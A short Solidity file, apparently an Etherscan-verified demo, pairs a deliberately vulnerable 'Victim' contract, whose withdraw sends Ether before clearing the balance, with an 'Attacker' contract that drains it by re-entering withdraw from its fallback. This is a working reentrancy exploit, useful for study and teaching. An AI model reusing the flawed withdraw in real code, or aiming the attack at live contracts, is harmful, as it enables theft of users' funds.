/**
 *Submitted for verification at Etherscan.io on 2022-02-22
*/

pragma solidity ^0.8.0;
contract Victim {
    mapping (address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
        balances[msg.sender] = 0;
    }

}

contract Attacker {
    Victim public victim = new Victim();

    function beginAttack() external payable {
        victim.deposit{value: 0.1 ether}();
        victim.withdraw();
    }

    receive() external payable {
        if (address(victim).balance >= 0.1 ether) {
            victim.withdraw();
        }
    }

}